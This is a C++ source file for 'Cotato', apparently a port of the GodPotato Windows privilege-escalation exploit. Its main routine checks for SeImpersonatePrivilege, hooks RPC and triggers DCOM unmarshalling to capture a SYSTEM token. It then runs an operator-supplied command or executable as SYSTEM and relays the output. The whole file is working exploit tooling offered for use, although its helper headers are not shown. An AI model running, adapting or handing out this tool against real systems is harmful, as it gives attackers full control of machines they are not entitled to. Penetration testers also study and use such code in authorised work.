#include "Trigger.h"
#include "potato.h"
#include "IStreamImpl.h"
#include "UnmarshalDCOM.h"
#include "ObjRef.h"
#include "log.h"

#include <windows.h>
#include <vector>
#include <iostream>
#include <string>

struct Options
{
    bool debug = false;
    bool useCmd = false;
    bool useExe = false;
    std::string cmd;
    std::string exe;
    std::vector<std::string> exeArgs;
};

static const char* kVersion = "0.1.0";

static void PrintBanner()
{
    std::cout << "==== Cotato ====" << std::endl;
    std::cout << "Version: " << kVersion << std::endl;
}

static void PrintUsage(const char* argv0)
{
    std::cerr << "Usage: " << argv0 << " -c \"command\" | -e \"exe\" [args...] [-d]" << std::endl;
    std::cerr << "  -d, --debug        Enable logs" << std::endl;
    std::cerr << "  -c, --cmd \"cmd\"   Run command via cmd.exe /c" << std::endl;
    std::cerr << "  -e, --exe \"exe\"   Run specified exe (no window, non-interactive)" << std::endl;
}

static bool ParseArgs(int argc, char* argv[], Options& out)
{
    for (int i = 1; i < argc; i++)
    {
        std::string arg = argv[i];
        if (arg == "-d" || arg == "--debug")
        {
            out.debug = true;
            continue;
        }
        if (arg == "-c" || arg == "--cmd")
        {
            if (i + 1 >= argc)
            {
                return false;
            }
            out.useCmd = true;
            out.cmd = argv[++i];
            continue;
        }
        if (arg == "-e" || arg == "--exe")
        {
            if (i + 1 >= argc)
            {
                return false;
            }
            out.useExe = true;
            out.exe = argv[++i];
            for (int j = i + 1; j < argc; j++)
            {
                out.exeArgs.emplace_back(argv[j]);
            }
            break;
        }
        return false;
    }

    if ((out.useCmd ? 1 : 0) + (out.useExe ? 1 : 0) != 1)
    {
        return false;
    }
    return true;
}

bool IsSeImpersonatePrivilegeEnabled()
{
    HANDLE tokenHandle = nullptr;
    
    // 打开当前进程的令牌
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
    {
        return false;
    }

    // 首先获取令牌信息的所需大小
    DWORD tokenInfoLength = 0;
    if (!GetTokenInformation(tokenHandle, TokenPrivileges, nullptr, 0, &tokenInfoLength))
    {
        DWORD error = GetLastError();
        if (error != ERROR_INSUFFICIENT_BUFFER)
        {
            CloseHandle(tokenHandle);
            return false;
        }
    }

    // 分配缓冲区以存储令牌特权信息
    std::vector<BYTE> tokenInformation(tokenInfoLength);
    
    if (!GetTokenInformation(tokenHandle, TokenPrivileges, tokenInformation.data(), tokenInfoLength, &tokenInfoLength))
    {
        CloseHandle(tokenHandle);
        return false;
    }

    // 获取特权信息结构
    PTOKEN_PRIVILEGES pTokenPrivileges = reinterpret_cast<PTOKEN_PRIVILEGES>(tokenInformation.data());
    
    // 查找SeImpersonatePrivilege的LUID
    LUID impersonateLuid = {};
    if (!LookupPrivilegeValueW(nullptr, SE_IMPERSONATE_NAME, &impersonateLuid))
    {
        CloseHandle(tokenHandle);
        return false;
    }

    // 遍历令牌中的所有特权，查找SeImpersonatePrivilege
    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; ++i)
    {
        if (pTokenPrivileges->Privileges[i].Luid.LowPart == impersonateLuid.LowPart &&
            pTokenPrivileges->Privileges[i].Luid.HighPart == impersonateLuid.HighPart)
        {
            // 检查该特权是否已启用
            if ((pTokenPrivileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) == SE_PRIVILEGE_ENABLED)
            {
                CloseHandle(tokenHandle);
                return true;
            }
        }
    }

    CloseHandle(tokenHandle);
    return false;
}


int main(int argc, char* argv[])
{
    log_set_enabled(true);
    PrintBanner();
    log_set_enabled(false);
    Options options;
    if (!ParseArgs(argc, argv, options))
    {
        PrintUsage(argv[0]);
        return 1;
    }
    log_set_enabled(options.debug);
    
    if (!IsSeImpersonatePrivilegeEnabled())
    {
        log_error("SeImpersonatePrivilege is not enabled.");
        return 1;
    }
    
    UUID uuid;
    RPC_STATUS status = UuidCreate(&uuid);
    if (status != RPC_S_OK)
    {
        log_errorf("UuidCreate failed: %ld", static_cast<long>(status));
        return 1;
    }

    // 将UUID转换为字符串
    RPC_CSTR uuidStr;
    status = UuidToStringA(&uuid, &uuidStr);
    if (status != RPC_S_OK)
    {
        log_errorf("UuidToStringA failed: %ld", static_cast<long>(status));
        return 1;
    }
    
    std::string pipeName(reinterpret_cast<char*>(uuidStr));
    RpcStringFreeA(&uuidStr);
    
    try
    {
        log_infof("[*] Initializing GodPotatoContext with pipe: %s", pipeName.c_str());
        GodPotatoContext godPotatoContext(pipeName);

        log_info("[*] Hooking RPC");
        godPotatoContext.hookRPC();
        log_info("[*] Starting pipe server");
        godPotatoContext.start();

        GodPotatoUnmarshalTrigger unmarshalTrigger(&godPotatoContext);
        int triggerResult = unmarshalTrigger.Trigger();
        if (triggerResult < 0)
        {
            log_errorf("Unmarshal trigger failed with result: 0x%lx", static_cast<unsigned long>(triggerResult));
        }

        HANDLE systemToken = godPotatoContext.getToken();
        if (systemToken != nullptr)
        {
            log_info("Successfully obtained SYSTEM token");
            
            // 启动进程使用获取到的系统令牌
            SECURITY_ATTRIBUTES sa{};
            sa.nLength = sizeof(sa);
            sa.bInheritHandle = TRUE;
            sa.lpSecurityDescriptor = nullptr;

            HANDLE readPipe = nullptr;
            HANDLE writePipe = nullptr;
            if (!CreatePipe(&readPipe, &writePipe, &sa, 0))
            {
                log_errorf("CreatePipe failed: %lu", GetLastError());
                CloseHandle(systemToken);
                return 1;
            }
            SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);

            STARTUPINFOW si{};
            PROCESS_INFORMATION pi{};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            si.wShowWindow = SW_HIDE;
            si.hStdOutput = writePipe;
            si.hStdError = writePipe;
            si.hStdInput = nullptr;
            
            std::wstring cmdLine;
            std::wstring appName;
            if (options.useCmd)
            {
                cmdLine = L"cmd.exe /c ";
                int wideCharCount = MultiByteToWideChar(CP_UTF8, 0, options.cmd.c_str(), -1, NULL, 0);
                if (wideCharCount > 0)
                {
                    std::vector<wchar_t> wideBuffer(wideCharCount);
                    MultiByteToWideChar(CP_UTF8, 0, options.cmd.c_str(), -1, wideBuffer.data(), wideCharCount);
                    cmdLine += std::wstring(wideBuffer.data());
                }
                else
                {
                    log_error("Failed to convert command argument to wide string");
                    CloseHandle(systemToken);
                    return 1;
                }
            }
            else
            {
                int wideCharCount = MultiByteToWideChar(CP_UTF8, 0, options.exe.c_str(), -1, NULL, 0);
                if (wideCharCount <= 0)
                {
                    log_error("Failed to convert exe path to wide string");
                    CloseHandle(systemToken);
                    return 1;
                }
                std::vector<wchar_t> exeWide(wideCharCount);
                MultiByteToWideChar(CP_UTF8, 0, options.exe.c_str(), -1, exeWide.data(), wideCharCount);
                appName.assign(exeWide.data());

                cmdLine = L"\"";
                cmdLine += appName;
                cmdLine += L"\"";

                for (const auto& arg : options.exeArgs)
                {
                    int argCount = MultiByteToWideChar(CP_UTF8, 0, arg.c_str(), -1, NULL, 0);
                    if (argCount > 0)
                    {
                        std::vector<wchar_t> argWide(argCount);
                        MultiByteToWideChar(CP_UTF8, 0, arg.c_str(), -1, argWide.data(), argCount);
                        cmdLine += L" ";
                        cmdLine += argWide.data();
                    }
                }
            }
            
            if (!CreateProcessWithTokenW(systemToken, LOGON_WITH_PROFILE,
                options.useExe ? appName.c_str() : NULL,
                const_cast<LPWSTR>(cmdLine.c_str()),
                0, nullptr, nullptr, &si, &pi))
            {
                DWORD error = GetLastError();
                log_errorf("CreateProcessWithTokenW failed: %lu", error);
                
                // 尝试使用CreateProcessAsUser作为备选方案
                log_info("Attempting alternative method...");
                
                HANDLE dupToken = nullptr;
                if (DuplicateTokenEx(systemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken))
                {
                    if (!CreateProcessAsUserW(dupToken, NULL, const_cast<LPWSTR>(cmdLine.c_str()),
                        NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
                    {
                        log_errorf("CreateProcessAsUserW also failed: %lu", GetLastError());
                        CloseHandle(dupToken);
                        CloseHandle(writePipe);
                        CloseHandle(readPipe);
                        CloseHandle(systemToken);
                        return 1;
                    }
                    else
                    {
                        log_info("Process started successfully with CreateProcessAsUserW");
                    }
                    CloseHandle(dupToken);
                }
                else
                {
                    log_errorf("DuplicateTokenEx failed: %lu", GetLastError());
                    CloseHandle(writePipe);
                    CloseHandle(readPipe);
                    CloseHandle(systemToken);
                    return 1;
                }
            }
            else
            {
                log_info("Process started successfully with CreateProcessWithTokenW");
            }
            
            CloseHandle(writePipe);

            std::string output;
            char buffer[4096];
            DWORD bytesRead = 0;
            while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, nullptr))
            {
                if (bytesRead == 0)
                {
                    break;
                }
                output.append(buffer, buffer + bytesRead);
            }
            CloseHandle(readPipe);

            WaitForSingleObject(pi.hProcess, INFINITE);
            DWORD exitCode = 0;
            GetExitCodeProcess(pi.hProcess, &exitCode);
            
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            CloseHandle(systemToken);
            
            if (!output.empty())
            {
                if (options.useCmd)
                {
                    std::cout << output;
                }
                else
                {
                    log_info(output.c_str());
                }
            }
            if (options.useCmd)
            {
                std::cout << "Command executed successfully. ExitCode=" << exitCode << std::endl;
            }
            else
            {
                log_infof("Command executed successfully. ExitCode=%lu", exitCode);
            }
        }
        else
        {
            log_error("Failed to obtain SYSTEM token");
            return 1;
        }
        
        godPotatoContext.restore();

    }
    catch (const std::exception& e)
    {
        log_errorf("Exception occurred: %s", e.what());
        return 1;
    }
    catch (...)
    {
        log_error("Unknown exception occurred");
        return 1;
    }

    return 0;
}
